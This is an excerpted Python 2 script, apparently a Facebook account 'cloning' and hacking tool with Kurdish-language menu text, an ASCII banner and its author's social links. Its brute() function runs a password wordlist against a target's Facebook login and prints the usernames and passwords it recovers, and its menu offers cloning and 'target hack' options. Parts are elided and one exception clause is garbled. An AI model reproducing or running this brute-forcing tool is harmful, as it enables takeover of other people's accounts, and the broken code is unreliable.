#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To The Professor
...
██║░░░░░██║░░██║╚█████╔╝██║░░░░░███████╗██████╔╝██████╔╝╚█████╔╝██║░░██║
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░╚═╝
\033[1;91m--> GITHUB :- https://github.com/TheProfessor0/TheProfessor/
\033[1;92m--> FACEBOOK :- https://www.facebook.com/shexy.gawra.5688
\033[1;93m--> YOUTUBE :-  https://www.youtube.com/channel/UCVXpwd2ItmJq4GEdJ8pVJ8g?view_as=subscriber
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "LOGIN BUIT LASAT " + username #Dev:PROFESSOR
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mPasswordaKat XaLLaTa"
...
def login():
	...
	print "1.\x1b[1;95mLogin  Facebook  "
        time.sleep(0.05)
        print "2.\x1b[1;95mToKeN ChYa W ChoN ToKeNy RasT WaR GriN"
        time.sleep(0.05)
        print "3.\x1b[1;95mLogin Bu Ba ToKeN"
        time.sleep(0.05)
	print "0.\033[1;95mExit           "
	pilih_login()
	
def pilih_login():
	peak = raw_input("\n\033[1;97mDaNaYaK HaLL BzheRa>>> \033[1;97m")
	if peak =="":
...
def login1():
	...
	try:
		...
		menu() 
	except (Errort WarGrt,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan('  \033[1;91mNote AccuntakaY XoT BaKaR MaHeNa' )
		jalan(' \033[1;92mAccountaky TaZa DaNe Bo HaCK ChunKa BAND ABY' )
		print "\033[1;93mCommandy TaZa Bo CloNe Clon"
		print('	' )
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\x1b[1;95mDaxll BuiT Ba Sarkawtuyy   PROFESSOR UP'
				os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
		...
		if 'checkpoint' in url:
			print("\n\x1b[1;91mAccountakat Chek Pointa")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;91mPassword/Emailaka xallata")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;91mAccountaka La Chek Pointayat"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;91mxatt xawa"
		keluar()
	...
	print "	   ID\033[1;91m:\033[1;93m"+id+"\x1b[1;93m              "
        ...
        time.sleep(0.05)
	print "1 .\x1b[1;94m\033[1;94mClonaka Dast Pe Akat   "
        time.sleep(0.05)
        print "2 .\x1b[1;94m\033[1;94mDast Pe Krdn Ba Target Hack        "
        time.sleep(0.05)
...
def brute():
    ...
    try:
        ...
        try:
            ...
            time.sleep(0.05)
            jalan('\x1b[1;94m[\xe2\x9c\xba] \x1b[1;94mTkaya Bosta \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    ...
                    if 'access_token' in mpsh:
                        ...
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ...
                            print  "--------------------------------------------------"
                            print '\x1b[1;91m[!] \x1b[1;97mChek Pointa'
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
...
def tokenz():
	...
	try:
		...
		e = raw_input("\033[1;97m[?] \033[1;97mTokenaka Hallaya\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
